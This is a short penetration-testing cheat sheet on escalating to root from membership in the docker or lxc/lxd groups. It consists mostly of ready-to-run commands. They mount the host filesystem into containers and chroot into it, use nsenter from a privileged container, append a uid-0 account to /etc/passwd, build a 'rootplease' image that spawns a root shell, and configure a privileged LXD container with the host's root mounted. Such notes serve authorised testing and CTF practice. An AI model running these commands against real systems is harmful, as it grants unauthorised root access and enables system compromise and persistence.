# Docker Groups

## Docker group exploits

To execute these exploits the current user has to be in `docker` group

### Writable Docker Socket

If the docker socket is writable it can be used to run commands as an elevated user. Only users in root and docker group can read the socket file.

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

### Access arbitrary folders

```
docker images
docker run -v <folder>:/mnt -it <image>
cd /mnt
```

### Add user to /etc/passwd

```
docker images
docker run -v /etc/:/mnt -it <image>
cd /mnt
echo "<username>:$(openssl passwd <password>):0:0:/root:/root:/bin/bash" >> passwd
exit
su <username>
```

### Spawn shell

```
docker images
docker run -v /:/mnt --rm -it <image> chroot /mnt sh
```

### Root Please Docker image

A docker image that spawns a root shell.

```
git clone https://github.com/chrisfosterelli/dockerrootplease rootplease
cd rootplease/
docker build -t rootplease .
docker run -v /:/hostOS -it --rm rootplease
```

## LXC / LXD group exploit

To execute this exploit the current user has to be in `lxc or lxd` group. Download configure and build an Alpine image, mount /root and execute /bin/sh as root.

```
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a <arch>

lxc image import ./alpine.tar.gz --alias myimage

lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

lxc start mycontainer
lxc exec mycontainer /bin/sh
```
